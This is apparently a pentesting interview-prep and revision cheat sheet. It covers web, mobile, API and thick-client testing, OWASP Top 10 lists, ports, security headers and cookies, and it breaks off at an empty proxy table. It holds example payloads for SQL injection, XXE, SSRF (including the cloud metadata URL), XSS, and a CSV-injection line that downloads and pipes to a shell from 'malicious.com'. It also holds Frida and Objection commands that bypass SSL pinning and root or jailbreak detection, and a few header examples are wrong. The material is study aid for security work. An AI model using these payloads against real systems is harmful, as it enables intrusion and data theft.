### Top 100 Web application Vulnerability and Mitigation:

| S.N | Link                                                                                         | By    |
|-----|----------------------------------------------------------------------------------------------|-------------|
| 1   | [Top 100 Web Application Vulnerability and Mitigation](https://github.com/m14r41/CyberSecurity-Interview/blob/main/VAPT/VAPT%20Interview%20PDF%20Lists/Top%20100%20-%20Web%20Vulnerability%20and%20Mitigation.pdf) | [Unknown](#) |

---

### **Common Questions Asked:**

| **Category**     | **Questions**                                                                                                                                                  |
|------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| **Web**          | - Login page explain : Possible attack scenarios <br> >> e.g  Authentication bypass via SQL injection, host header injection, URL redirection, username enumeration, rate limiting, brute force, etc. <br> - SQL Injection and its types <br> - What is SSRF and common bypass techniques? <br> - What is XSS and its types? Expalain DOM XSS. <br> - XML External Entity (XXE) attacks <br> - What is Billion Laughs Attack? <br> - Expalin Deserialization Vulnerabilities <br> - Directory Traversal vs Directory Listing <br> - Local File Inclusion (LFI) vs Remote File Inclusion (RFI) <br> - SSRF Vulnerability and its bypass <br> - By SSRF attack how to command injection, port scanning, etc. <br> - What are common security headers and their values? <br> - What are the different types of cookie values? <br> - What is a JWT token and which part can an attacker exploit (HEADER, PAYLOAD, VERIFY SIGNATURE)? |
| **Mobile**       | - What is ADB? <br> - What is an IPA/Manifest file? <br> - What are the most common components of Android (Activity, Intents, Content Providers)? <br> - How to perform mobile pentesting (static & dynamic) <br> - What are the tools used in mobile pentesting (MobSF, JDAX-GUI, APKTool, Burp Suite, Frida, Objection)? <br> - How to set up a proxy on Android/iOS <br> - What are common vulnerabilities in Android applications? <br> - What are the common components of iOS applications? <br> - How to perform iOS pentesting (static and dynamic) <br> - How to bypass SSL pinning on Android and iOS (Frida, Objection) <br> - How to bypass root/jailbreak detection <br> - How to exploit activities <br> - What are static vulnerabilities in Android? <br> - Root/Jailbreak Detection Bypass <br> - How to perform dynamic pentesting on Android and iOS |
| **API**          | - What is an API and what are its common types (e.g., REST, SOAP, GraphQL)? <br> - What are the common tools used for API testing? <br> - What are the API authentication and authorization issues? <br> - What is Broken Object Level Authorization? <br> - Insecure Direct Object References <br> - Common misconfigurations in APIs <br> - What are JSON Web Token (JWT) vulnerabilities? <br> - What tests can be performed on a payment gateway API after checkout? |
| **Thick Client** | - What is a thick client and a thin client? <br> - What are the common tools used for thick client testing? <br> - How will you perform thick client pentesting (static and dynamic)? <br> - What is DLL hijacking and how is it performed? <br> - How to intercept traffic (Burp Suite invisible proxying, EchoMirage, Fiddler, Wireshark) <br> - How to perform binary analysis and reverse engineering (dnSpy) <br> - Insecure Local Storage <br> - Memory dump (Process Hacker) <br> - Lack of Proper Authentication and Authorization <br> - Insufficient Encryption and Weak Session Management <br> - What to perform in registry-related attacks (RegShot) |





## Web Application Security Quick Revision

| **Topic**                        | **Description**                                                                                                         | **Example Payloads**          |
|----------------------------------|-------------------------------------------------------------------------------------------------------------------------|--------------------------------|
| **SQL Injection**                | Attacker manipulates SQL queries to gain unauthorized access or control over the database. Types include In-Band, Inferential, and Out-of-Band. | `1' OR '1'='1`, `UNION SELECT * FROM users` |
| **SSRF (Server-Side Request Forgery)** | Server-Side Request Forgery (SSRF) is a security vulnerability where an attacker tricks a server into making requests to internal or external resources that the attacker cannot access directly. This can allow the attacker to access restricted data or services within the server’s network.  | Common bypass techniques include:<br>- **Whitelisted Domains Bypass**:<br>  - Protocols: `file://` (e.g., `file:///etc/passwd`), `SFTP://` (e.g., `sftp://generic.com`)<br>  - Bypass by HTTPS (e.g., `https://127.0.0.1/` as `https://localhost/`)<br>  - URL Encoding (e.g., `http://127.0.0.1/%61dmin`)<br>  - Decimal IP (e.g., `192.168.1.1` as `3232235777`)<br>  - Octal IP (e.g., `192.168.1.1` as `0300.0250.01`) `http://localhost:8080/admin`, `http://169.254.169.254/latest/meta-data/` |
| **XML Attack**                   | Exploits vulnerabilities in XML parsers, such as XML External Entity (XXE) attacks and XML Injection.                  | `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><foo>&xxe;</foo>` |
| **Login Page Scenarios**         | Various attacks on login pages: SQL Injection, Host Header Injection, URL Redirection, Username Enumeration, Rate Limiting/Brute Force. | `admin' OR '1'='1`, `http://example.com?redirect=http://malicious.com`, `admin@domain.com` |
| **Billion Laughs Attack**        | XML Bomb attack that causes resource exhaustion by creating deeply nested XML entities.                                 | `<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol1 "&lol;"><!ENTITY lol2 "&lol1;"> ...` |
| **Deserialization Vulnerability** | Exploits insecure deserialization of objects, leading to remote code execution or other attacks.                        | `O:12:"SomeClass":1:{s:4:"prop";s:10:"malicious_code";}` |
| **Directory Traversal**          | Exploits path traversal vulnerabilities to access directories and files outside the intended directory.                 | `../etc/passwd`, `../../../../etc/shadow` |
| **LFI (Local File Inclusion)**   | Attacker includes local files on the server, potentially leading to exposure of sensitive information.                  | `file:///etc/passwd`, `../config.php` |
| **RFI (Remote File Inclusion)**  | Attacker includes remote files from an external server, which may lead to remote code execution.                         | `http://malicious.com/malicious_script.php` |
| **SSRF Exploits**                | Exploiting SSRF to perform LFI, RFI, command injection, port scanning, etc., by manipulating server-side requests.       | `http://localhost:8000/admin`, `http://127.0.0.1:8080/`, `http://example.com?param=..%2F..%2F..%2Fetc%2Fpasswd` |
| **Tabnabbing**                   | Phishing technique where an attacker manipulates a tab or window to deceive users into entering sensitive information. | N/A (no specific payload, requires technique) |
| **Cache Poisoning**              | Attacker manipulates cached responses to serve malicious content or bypass security controls.                            | `Cache-Control: no-store`, `X-Original-URL: http://malicious.com` |
| **DOM XSS (Document Object Model XSS)** | Exploits vulnerabilities in client-side scripts to execute malicious code in the user's browser. Simplified as: attacker manipulates the DOM environment to inject and execute scripts. | `javascript:alert('XSS')`, `<img src="x" onerror="alert('XSS')">` |
| **CSV Injection**                | Attacker injects malicious code into CSV files which can be executed when the file is opened in spreadsheet applications. | `=cmd|'/C calc'!A0`, `;wget http://malicious.com/malware -O- | sh` |
| **Parameter Pollution**          | Attacker manipulates URL or request parameters to bypass filters or alter application behavior.                         | `?id=1&id=2`, `?search=valid&search=malicious` |
| **SSRF Bypass Techniques**       | Various methods to bypass SSRF protections, such as using alternative protocols or obfuscation techniques.              | `http://localhost%2Fadmin`, `http://127.0.0.1:8080%2Fadmin` |
| **Privilege Escalation**         | Techniques used by attackers to gain higher-level access within an application or system. Methods include exploiting insecure permissions, bypassing access controls, or exploiting vulnerabilities. | `id=1; sudo bash`, `?user=admin` |
| **BOLA vs IDOR**                 | **BOLA (Broken Object Level Authorization)**: Access control issues allowing unauthorized access to objects.<br>**IDOR (Insecure Direct Object References)**: Direct access to objects without proper authorization checks. | `?documentId=123`, `?fileId=456` |
| **Methods of Privilege Escalation** | Techniques include exploiting vulnerabilities in user roles, accessing unauthorized resources, privilege misconfigurations, or bypassing role-based access controls. | `admin`, `role=superuser` |
| **Login Page Testing**           | Tests include:<br>- **SQL Injection**: Inject SQL code into login fields.<br>- **Host Header Injection**: Manipulate headers to redirect or inject content.<br>- **URL Redirection**: Test for unauthorized redirection.<br>- **Username Enumeration**: Check if usernames are exposed.<br>- **Rate Limiting/Brute Force**: Attempt to bypass rate limits to perform brute force attacks. | `admin' OR '1'='1`, `http://example.com?redirect=http://malicious.com`, `admin@domain.com` |



### **DOM XSS Overview in Details**

| **Aspect**        | **Details**                                                                                                                                      |
|-------------------|--------------------------------------------------------------------------------------------------------------------------------------------------|
| **Definition**    | DOM-based Cross-Site Scripting (DOM XSS) is a type of XSS attack where the vulnerability exists in the client-side code (JavaScript) rather than in the server-side code. It occurs when an attacker can manipulate the DOM (Document Object Model) of a web page in such a way that malicious scripts are executed in the user's browser. |
| **Conditions**    | - **Client-side JavaScript**: The attack relies on JavaScript code running in the user's browser. <br> - **Manipulated Input**: User input is improperly handled or sanitized, allowing script injection. <br> - **Dynamic Content**: Web pages dynamically update content based on user input or URL parameters. |
| **Where Performed** | - **URL Parameters**: Injecting scripts through URL query parameters. <br> - **DOM Manipulation**: Exploiting JavaScript functions that update the DOM using user input (e.g., `document.write`, `innerHTML`). <br> - **User Input**: Malicious input in fields or data that is dynamically added to the page. |
| **Examples**      | - **Example 1**: If a web application uses the following code to reflect a URL parameter into the page without proper validation: <br> `document.getElementById("output").innerHTML = location.hash.substring(1);` <br> An attacker can exploit this by visiting a URL like `http://example.com/#<script>alert('XSS')</script>`, causing the script to execute in the browser. <br><br> - **Example 2**: A web page that uses `document.location` to dynamically insert content into the page: <br> `document.getElementById("content").innerHTML = document.location.search.substring(1);` <br> If an attacker crafts a URL like `http://example.com/?<script>alert('XSS')</script>`, the script will execute on the page. <br><br> - **Example 3**: A site using `eval()` to execute JavaScript code from user input: <br> `eval(document.getElementById("codeInput").value);` <br> If an attacker inputs `<script>alert('XSS')</script>` into the `codeInput` field, it will be executed when `eval()` runs. |


### SQL Injection and Its Types


| **Type**                       | **Sub-Type**                  | **Description**                                                                                      | **Example Commands**                                  |
|-------------------------------|-------------------------------|------------------------------------------------------------------------------------------------------|-----------------------------------------------------|
| **In-band SQL Injection**      |                               | Uses the same communication channel for both launching the attack and retrieving results              |                                                     |
|                                | a) **Union-based SQLi**       | Utilizes the SQL UNION operator to combine the results of multiple SELECT queries into a single result set | `1 UNION SELECT username, password FROM users, ' UNION SELECT null, null--, ' UNION SELECT null, null, null--, ' UNION SELECT null, null, null, null--` |
|                                | b) **Error-based SQLi**       | Injects SQL code that triggers database errors, potentially revealing information about the database schema or contents | `AND 1=1--, SELECT 1/0--, AND 1=0--, AND 1=1#, OR 1=1, OR x=x` |
| **Blind SQL Injection**        |                               | The attacker does not see the result of the query directly but infers information from the application's responses |                                                     |
|                                | a) **Boolean-based Blind SQLi** | Sends SQL queries that result in true or false responses to infer data based on the application's behavior | `' OR '1'='1, ' OR 1=1--, " OR "" = ", " OR 1 = 1--, ' OR '' = ', ' OR 1=1 AND 'a'='a` |
|                                | b) **Time-based Blind SQLi**  | Introduces delays in SQL queries to infer data based on the application's response time              | `SLEEP(5)--, " OR SLEEP(5)--, ' OR SLEEP(5)--, WAITFOR DELAY '00:00:10'--` |
| **Out-of-band SQL Injection**  |                               | Uses alternative communication channels (such as DNS or HTTP) to exfiltrate data                      | `http://example.com/somepage.php?id=1; nslookup attacker.com` |
| **Second-order SQL Injection** |                               | The malicious payload is stored within the application's database and executed later when certain conditions are met | `INSERT INTO users (username, password) VALUES ('test', 'test'); -- The stored payload executes later when the application processes the data` |




#### OWASP TOP 10: Web and Mobile:
| **2021 Web Top 10**                            | **Mobile Top 10 2024**             |
|-----------------------------------------------|------------------------------------------|
| A01:2021-Broken Access Control                | M1: Improper Credential Usage            |
| A02:2021-Cryptographic Failures               | M2: Inadequate Supply Chain Security     |
| A03:2021-Injection                            | M3: Insecure Authentication/Authorization|
| A04:2021-Insecure Design                      | M4: Insufficient Input/Output Validation|
| A05:2021-Security Misconfiguration           | M5: Insecure Communication               |
| A06:2021-Vulnerable and Outdated Components  | M6: Inadequate Privacy Controls          |
| A07:2021-Identification and Authentication Failures| M7: Insufficient Binary Protections |
| A08:2021-Software and Data Integrity Failures | M8: Security Misconfiguration           |
| A09:2021-Security Logging and Monitoring Failures| M9: Insecure Data Storage            |
| A10:2021-Server-Side Request Forgery (SSRF)*  | M10: Insufficient Cryptography          |

<br>

#### OWASP top : API and Thick Client

| **OWASP Top 10 API Security Risks**                     | **2023 OWASP Desktop App Security Top 10**          |
|--------------------------------------------------------|-----------------------------------------------------|
| API1:2023 Broken Object Level Authorization            | DA1 - Injections                                    |
| API2:2023 Broken Authentication                        | DA2 - Broken Authentication & Session Management    |
| API3:2023 Broken Object Property Level Authorization   | DA3 - Sensitive Data Exposure                      |
| API4:2023 Unrestricted Resource Consumption           | DA4 - Improper Cryptography Usage                  |
| API5:2023 Broken Function Level Authorization         | DA5 - Improper Authorization                       |
| API6:2023 Unrestricted Access to Sensitive Business Flows | DA6 - Security Misconfiguration                |
| API7:2023 Server Side Request Forgery                  | DA7 - Insecure Communication                       |
| API8:2023 Security Misconfiguration                    | DA8 - Poor Code Quality                            |
| API9:2023 Improper Inventory Management                | DA9 - Using Components with Known Vulnerabilities  |
| API10:2023 Unsafe Consumption of APIs                 | DA10 - Insufficient Logging & Monitoring           |

<br><br>
### Most Common Ports and services

| **Common Ports and Services**                | **Common Ports and Services**                      |
|---------------------------------------------|----------------------------------------------------|
| 20 - FTP (File Transfer Protocol)          | 514 - Syslog                                       |
| 21 - FTP (File Transfer Protocol)          | 53 - DNS (Domain Name System)                      |
| 22 - SSH (Secure Shell)                    | 587 - SMTP (Submission)                            |
| 23 - Telnet                                | 67 - DHCP (Dynamic Host Configuration Protocol) - Server |
| 25 - SMTP (Simple Mail Transfer Protocol)  | 5900 - VNC (Virtual Network Computing)             |
| 68 - DHCP (Dynamic Host Configuration Protocol) - Client | 3389 - RDP (Remote Desktop Protocol)       |
| 80 - HTTP (Hypertext Transfer Protocol)    | 110 - POP3 (Post Office Protocol version 3)        |
| 115 - SFTP (Simple File Transfer Protocol) | 119 - NNTP (Network News Transfer Protocol)        |
| 123 - NTP (Network Time Protocol)          | 143 - IMAP (Internet Message Access Protocol)      |
| 161 - SNMP (Simple Network Management Protocol) | 27017 - MongoDB                                   |
| 3306 - MySQL Database                      | 5432 - PostgreSQL Database                         | 

<br><br>
#### Common Missing Security Headers:
| Security Header               | Description                                                                                                                                                                      | Vul vs Fix                                                                                                                   |
|-------------------------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------|
| **Content-Security-Policy**  | In simple terms, the purpose of the "Content Security Policy" (CSP) header is to help protect websites from malicious attacks, particularly Cross-Site Scripting (XSS).          | `Content-Security-Policy: script-src 'self' 'unsafe-inline' 'unsafe-eval';`<br>`Content-Security-Policy: default-src 'self'; script-src 'self' https://apis.google.com ;`<br><br> **Example 2:**<br>`Content-Security-Policy: default-src 'self' https://example.com;`<br>`Content-Security-Policy: default-src 'self'; script-src 'self' https://example.com;` |
| **X-Frame-Options**          | X-Frame-Options : Tell the browser whether you want to allow your site to be framed or not. By preventing a browser from framing your site you can defend against attacks like clickjacking. | `X-Frame-Options: SAMEORIGIN`<br>`X-Frame-Options: Self`                                                                                                                                 |
| **X-Content-Type-Options**   | X-Content-Type-Options stops a browser from trying to MIME-sniff the content type and force it to stick with the declared content-type.                                             | `X-Content-Type-Options: no sniff"`                                                                                                                                                      |
| **Referrer-Policy**          | In simpler terms, the purpose of the "Referrer Policy" header is to control how much information the browser shares when you click on a link and leave a webpage.                | **Vulnerable Example:**<br>`Referrer-Policy: unsafe-url`<br>This setting allows the full URL (including path and query parameters) to be sent in the Referer header, potentially exposing sensitive information.<br><br>**Fix Example:**<br>`Referrer-Policy: strict-origin`<br>This setting instructs the browser to include only the origin (scheme, host, and port) of the referring URL in the Referer header, enhancing user privacy and security. |
| **Permissions-Policy**       | - **Purpose:** Controls which browser features and APIs can be used.<br>- **Vulnerable Example:** Permissions-Policy:accelerometer=*<br>This setting allows any origin to access the device's accelerometer API, potentially leading to unauthorized access or misuse of sensitive device capabilities.<br>- **Fix Example:** Permissions-Policy: accelerometer=()<br>This setting restricts access to the accelerometer API to the same origin only, preventing unauthorized access and reducing the risk of exploitation. | `Permissions-Policy: camera=*, geolocation=*, microphone=*`<br>This policy allows any origin to access the camera, geolocation, and microphone APIs, potentially leading to unauthorized access or misuse of sensitive device capabilities:<br>`Permissions-Policy: camera=(), geolocation=(), microphone=()`<br>This policy restricts access to the camera, geolocation, and microphone APIs to the same origin only, preventing unauthorized access and reducing the risk of exploitation. | 

<br><br>
### Common Cookies and It’s values


| Cookies         | Values             | Description                                                                                                                                                                   | Vulnerable Example                                  | Fix Example                                                                                                       |
|-----------------|--------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|-----------------------------------------------------|--------------------------------------------------------------------------------------------------------------------|
| Secure          | Secure             | By setting the secure attribute, the cookie will only be sent over HTTPS connections, reducing the risk of interception by attackers.                                       | `Set-Cookie: session_id=abc123;`                   | `Set-Cookie: session_id=abc123; Secure`                                                                           |
| HttpOnly        | HttpOnly           | When a cookie has the HttpOnly attribute set, JavaScript cannot access it, which helps mitigate certain types of XSS attacks.                                                | `Set-Cookie: session_id=abc123;`                   | `Set-Cookie: session_id=abc123; HttpOnly`                                                                         |
| SameSite        | Strict, Lax, None | The SameSite attribute defines when cookies should be sent along with cross-site requests.                                                                                    | `Set-Cookie: session_id=abc123; SameSite=None`     | `Set-Cookie: session_id=abc123; SameSite=Strict; Secure`                                                           |




<br><br>
### Intruder attack Type:


| Attack Type    | Description                                                                                                                                                                   |
|----------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| **Sniper:**    | - Work on single payload set.<br>- If 3 positions are selected then one by one position are set with payload to run. It work set payload in first position and rest two values will as it is. Now same goes of rest two positions.<br>- It means sniper handles single position at a time. |
| **Battering RAM** | - Work on single payload set.<br>- Payload set at all positions simultaneously.                                                                                                  |
| **Pitchfork**  | - Work on multiple sets of payload.<br>- Work on the minimum number of payloads.<br>- If two payloads contain numbers like 6 and 4, then will generate 4 payloads only.<br>- To run this at all positions one payload is needed. |
| **Cluster Bomb** | - Work on multiple sets of payload.<br>- All the permutation and combination of payloads are generated.<br>- Suppose if the payload set is 2 and position also two then works as shown in image. |







---
---
# Android and iOS Pentesting :
---

Android architecture contains different number of components to support any android device
needs. Android software contains an open-source Linux Kernel having collection of number of C/C++
libraries which are exposed through an application framework services.

Among all the components Linux Kernel provides main functionality of operating system functions to
smartphones and Dalvik Virtual Machine (DVM) provide platform for running an android application.

The main components of android architecture are following:-

- Applications
- Application Framework
- Android Runtime
- Platform Libraries
- Linux Kernel

| **Component**              | **Description**                                                                                                   |
|----------------------------|-------------------------------------------------------------------------------------------------------------------|
| **Applications**           | Top layer where pre-installed and third-party applications reside. Runs within Android runtime using framework services. |
| **Application Framework** | Provides essential classes for creating applications, including services like activity manager and notification manager. |
| **Android Runtime**        | Contains core libraries and Dalvik Virtual Machine (DVM) that support application execution.                        |
| **Dalvik Virtual Machine** | Optimized for Android, DVM manages multiple instances efficiently and relies on Linux kernel for low-level tasks.    |
| **Platform Libraries**     | Includes C/C++ and Java libraries for media, graphics, and databases, among others.                                 |
| **Linux Kernel**           | Core of Android architecture managing drivers, memory, power, and providing security, memory, and process management. |


### Common Components :

| **Component**                | **Description**                                                                                       | **Potential Security Issues**                                       |
|------------------------------|-------------------------------------------------------------------------------------------------------|---------------------------------------------------------------------|
| **Activity**                 | Represents a single screen with a user interface in an Android application. Entry point for user interaction. | Insecure data storage, input validation, authentication flaws.      |
| **Broadcast Receiver**       | Listens for system-wide broadcast messages or intents. Responds to system events.                      | Insecure broadcast handling, privilege escalation.                 |
| **Intent**                   | Messaging object used to communicate between components. Starts Activities, Services, delivers broadcasts, or passes data. | Intent spoofing, intent injection, insecure data passing.           |
| **Explicit Intents**         | Used to start a specific component within the same application. Requires specifying the target component's class or package name. | Example: Starting a new Activity within the app.                   |
| **Implicit Intents**         | Used to trigger actions based on an action string. Does not specify the target component's name but defines an action to be performed. Android system resolves the intent based on available components capable of handling the action. | Example: Opening a web page or sending an email.                   |
| **Service**                  | Background component that performs long-running operations. Runs tasks asynchronously without a user interface. | Insufficient authentication, denial of service (DoS), data leakage. |
| **Content Provider**         | Manages shared application data accessible by other applications or components. Provides a standardized interface for accessing and manipulating data. | Insecure data exposure, insufficient access controls.              |
| **Manifest File (AndroidManifest.xml)** | Configuration file containing essential information about the application. Declares components, permissions, and hardware requirements. | Excessive permissions, missing security controls.                   |
| **WebView**                  | Embeds web content within an application. Can execute JavaScript, load remote URLs, and interact with the DOM. | JavaScript injection, XSS attacks, insecure communication.         |
| **Activity Manager**         | Manages the lifecycle of application activities. Controls the creation, starting, pausing, and stopping of activities. Handles activity stacking and navigation within the application. | Potential for activity leakage, improper activity lifecycle handling leading to data leaks or crashes. |



### Common Tool for Static Analysis–

- **Tool** :
    - **Automation** : MobSF, BuprSuite, Frida, Drozer ...
    - **Manual** : Burpsuite, apktool , jadx-gui, dex2jar, Ghidra

**dex2jar** is a command-line tool for converting Android DEX files (Dalvik Executable) to JAR files,
which can then be decompiled using Java decompiles like JD-GUI

**Ghidra** is powerful reverse engineering framework. It provides features for disassembly,
decompilation, scripting, and collaborative reverse engineering, making it suitable for static analysis


### APK Folder Components

| **Component**             | **Description**                                                                                     |
|---------------------------|-----------------------------------------------------------------------------------------------------|
| **AndroidManifest.xml**   | Contains information about the application, including its package name, version number, permissions, and components like activities, services, and broadcast receivers. |
| **Classes.dex**           | Contains the compiled Java bytecode for the application's classes, executed by the Android Runtime (ART). |
| **Resources.arsc**        | Contains compiled resources such as strings, images, and layouts used by the application.         |
| **lib/**                  | Folder containing compiled native code libraries for specific device architectures, such as ARM or x86. |
| **META-INF/**             | Contains the manifest file, the certificate of the APK signature, and a list of all files in the APK with their checksums. |
| **assets/**               | Contains additional application data files, such as sound and video files, that are not compiled into the APK. |
| **res/**                  | Folder containing application resources, such as layouts, strings, and images, in their original format before being compiled into Resources.arsc. |
| **Android System Files**  | Contains system-level files like the Android runtime, framework libraries, and system components used by the application. |




## APK Static Analysis

| **Aspect**                        | **Description**                                                                                                      |
|-----------------------------------|----------------------------------------------------------------------------------------------------------------------|
| **Permissions**                   | Check if the application requests sensitive permissions (camera, microphone, location, SMS, call logs). Unnecessary permissions may indicate privacy violations or security risks. |
| **Components**                    | Evaluate Android components (activities, services, receivers, providers) for potential exploitation. Ensure components are not exposed with overly permissive access. |
| **android:exported**              | This attribute should be set to `false` to prevent unauthorized access. The default value is `true`.                 |
| **Intents**                       | Review the use of implicit intents to ensure they are not susceptible to interception or manipulation by attackers.  |
| **Allow debugable**               | Should be `false`. If set to `true`, it can allow data extraction or arbitrary code execution without a rooted phone. The default value is `false`. |
| **Allow backup**                 | Should be `false`. This setting controls whether application data can be backed up and restored via USB debugging. The default value is `true`. |
| **Application information**       | Check for hard-coded credentials, sensitive information, or debugging features that could be exploited.             |
| **Malware signatures**            | Analyze for any known malware signatures that could suggest the app is malicious or harmful.                        |
| **Target SDK version**            | Verify if the app targets the latest Android SDK version. Older SDK versions might have known security vulnerabilities. |



### Common Static Vulnerabilities

| **Vulnerability**               | **Description**                                                                                                             |
|---------------------------------|-----------------------------------------------------------------------------------------------------------------------------|
| **Weak Cryptography**           | Examine the use of encryption algorithms to ensure correct implementation. Check for hardcoded keys, weak methods, or insecure algorithms. |
| **Code Obfuscation**            | Review obfuscation techniques to ensure they don't hide malicious code. Verify that obfuscation effectively protects against reverse engineering. |
| **API Usage**                   | Ensure that no insecure or vulnerable APIs are used. Look for APIs that allow unauthorized access or data leakage.         |
| **Hardcoded Sensitive Information** | Look for insecure storage of sensitive data. Check for hardcoded database queries, passwords, keys, or URLs.                |
| **External Libraries**          | Verify that third-party libraries used are not insecure or vulnerable.                                                     |
| **Integrity Checks**            | Check for mechanisms to ensure code integrity and prevent tampering.                                                         |
| **Native Code**                 | If native code is present, verify it is securely compiled and free from vulnerabilities.                                     |
| **Web View Related Checks**     | - **setJavaScriptEnabled()**: Ensure proper validation to prevent injection of malicious JavaScript code. <br> - **setAllowFileAccess()**: Validate input to prevent unauthorized file access/modification. <br> - **addJavascriptInterface()**: Validate input to prevent execution of arbitrary Java code. <br> - **runtime.exec()**: Prevent injection of malicious input to avoid execution of arbitrary shell commands. |
| **Root Detection Implementation Details** | Verify the implementation of root detection mechanisms to ensure they are effective.                                         |
| **SSL Pinning Implementation Details**     | Review SSL pinning implementation to ensure secure communication and prevent man-in-the-middle attacks.                      |


## APK Dynamic Analysis

### Frida vs Drozer vs SSL Pinning –

**Frida:**

- Dynamic instrumentation toolkit for mobile app security testing.
- Supports Android and iOS devices.
- Allows injection of JavaScript into running applications.
- Features function hooking, method interception, data manipulation, and security mechanism bypass.
- Useful for real-time manipulation of app behavior and analyzing security vulnerabilities

**Drozer:**

- Comprehensive security assessment tool for Android applications.
- Enables dynamic analysis, code review, and exploitation.
- Provides features such as data theft, permission analysis, and component manipulation.
- Designed for penetration testers to assess Android app security thoroughly.

**SSL Pinning:**

- Security mechanism used in mobile applications.
- Prevents unauthorized interception of communication.
- Ensures communication only with trusted servers.
- Mitigates risks of Man-in-the-Middle attacks.
- Implemented by embedding and verifying server certificates or public keys.
- Essential for safeguarding sensitive data in transit

### Lab Setup and perquisite for Dynamic Pretesting –

- **Download any emulator** : Android Studio, Genymotion, NoxPlayer
- **Proxy Configuration**
    - Export burpsuite certificate
    - Configured port and interface in burpsuite.
    - Setup manual proxy in android device and enter the ip and port of burp config.
    - Send Burpsuite certificate in android and install.
    - Burp configuration done.
- **Setup Frida with BuprSuite:**
    - Check android architecture and download accordingly **Frida-server**
       adb shell getprop ro.product.cpu.abi // Check architecture
    - Download the burp certificate and renamed it as cert-der.crt

- Now send the Frida-server and burp certificate in android location /data/local/tmp
- Done!

### ADB Basics

| **Description** | **Command** |
|-----------------|-------------|
| **Install an APK** | `adb install <path_to_apk>` |
| **Connect to a device over TCP/IP (example)** | `adb connect <device_ip>:<port>` |
| **List all installed packages** | `adb shell pm list packages` |
| **List all installed packages with file paths** | `adb shell pm list packages -f` |
| **Get detailed information about a specific package** | `adb shell dumpsys package <package_name>` |
| **Uninstall a specific package** | `adb uninstall <package_name>` |
| **Clear data of a specific package** | `adb shell pm clear <package_name>` |
| **List all running processes** | `adb shell ps` |
| **Backup the entire phone** | `adb backup -all -f backup.ab` |
| **Backup a specific application’s data** | `adb backup -f app_backup.ab -apk -shared -all <package_name>` |
| **Restore the entire phone from backup** | `adb restore backup.ab` |
| **Restore a specific application’s data from backup** | `adb restore app_backup.ab` |





## SSL Pinning Bypass

| **Platform** | **Tool & Method**                                                        | **Command**                                                                                         | **Description**                                               |
|--------------|--------------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------|---------------------------------------------------------------|
| **Android**  | [Frida Method 1 (Online)](https://frida.re/)                             | `frida -U --codeshare pcipolloni/universal-android-ssl-pinning-bypass-with-frida -f <Binary-Identifier>` | Bypass SSL pinning on Android using an online Frida script.  |
|              | **Frida Method 2 (Local)**                                               | `frida -U -L ssl-bypass-script.js -f <Binary-Identifier>`                                               | Bypass SSL pinning on Android using a locally stored Frida script. |
|              | **Frida Method 3 (Package Specific)**                                    | `frida -U -f <Package-Name> -l ssl-fridascript.js`                                                  | Bypass SSL pinning on Android using a package-specific Frida script. |
|              | **Exposed-Module Method**                                                | `adb install mobi.acpm.sslunpinning_latest.apk`<br>Open the app in Android and check for SSL unpinning. | Bypass SSL pinning on Android using the Exposed Module.       |
|              | [Objection Method 1](https://github.com/ac-pm/SSLUnpinning_Xposed.git) | `objection -g <Binary-Identifier> explore`<br>`android sslpinning disable`                           | Disable SSL pinning on Android using Objection.              |
|              | **Objection Method 2**                                                     | `objection -g <Binary-Identifier> explore -s "android sslpinning disable"`                          | Disable SSL pinning on Android using Objection at runtime.    |
| **iOS**      | **Frida Method 1 (Online)**                                                | `frida -U --codeshare pcipolloni/universal-ios-ssl-pinning-bypass-with-frida -f <Binary-Identifier>`    | Bypass SSL pinning on iOS using an online Frida script.      |
|              | **Frida Method 2 (Local)**                                                 | `frida -U -L ssl-bypass-script.js -f <Binary-Identifier>`                                               | Bypass SSL pinning on iOS using a locally stored Frida script. |
|              | **Objection Method 1**                                                     | `objection -g <Binary-Identifier> explore`<br>`ios sslpinning disable`                              | Disable SSL pinning on iOS using Objection.                  |
|              | **Objection Method 2**                                                     | `objection -g <Binary-Identifier> explore -s "ios sslpinning disable"`                              | Disable SSL pinning on iOS using Objection at runtime.        |

## Root/Jailbreak Detection Bypass

| **Platform** | **Tool & Method**                                                        | **Command**                                                                                         | **Description**                                               |
|--------------|--------------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------|---------------------------------------------------------------|
| **Android**  | **Frida Method 1 (Online)**                                              | `frida -U --codeshare incogbyte/android-root-bypass -f <Binary-Identifier>`                            | Bypass root detection on Android using an online Frida script. |
|              | **Frida Method 2 (Local)**                                                | `frida -U -L root-bypass-script.js -f <Binary-Identifier>`                                               | Bypass root detection on Android using a locally stored Frida script. |
|              | **Frida Method 3 (Anti-Root Detection)**                                  | `frida -U --codeshare dzonerzy/fridantiroot -f <Package-Name>`                                         | Bypass anti-root detection on Android using a Frida script.    |
|              | **Objection Method 1**                                                     | `objection -g <Binary-Identifier> explore`<br>`android root disable`                                | Disable root detection on Android using Objection.           |
|              | **Objection Method 2**                                                     | `objection -g <Binary-Identifier> explore -s "android root disable"`                                 | Disable root detection on Android using Objection at runtime. |
| **iOS**      | **Frida Method 1 (Online)**                                                | `frida -U --codeshare incogbyte/ios-jailbreak-bypass -f <Binary-Identifier>`                           | Bypass jailbreak detection on iOS using an online Frida script. |
|              | **Frida Method 2 (Local)**                                                 | `frida -U -L jailbreak-bypass-script.js -f <Binary-Identifier>`                                          | Bypass jailbreak detection on iOS using a locally stored Frida script. |
|              | **Objection Method 1**                                                     | `objection -g <Binary-Identifier> explore`<br>`ios jailbreak disable`                               | Disable jailbreak detection on iOS using Objection.          |
|              | **Objection Method 2**                                                     | `objection -g <Binary-Identifier> explore -s "ios jailbreak disable"`                               | Disable jailbreak detection on iOS using Objection at runtime. |



## Configure Proxy with Burp Suite, ADB, and Emulators

| **Method**                        | **Platform**          | **Steps/Command**                                                                                                     | **Description**                                                                                     |
|-----------------------------------|-----------------------|---------------------------------------------------------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------|
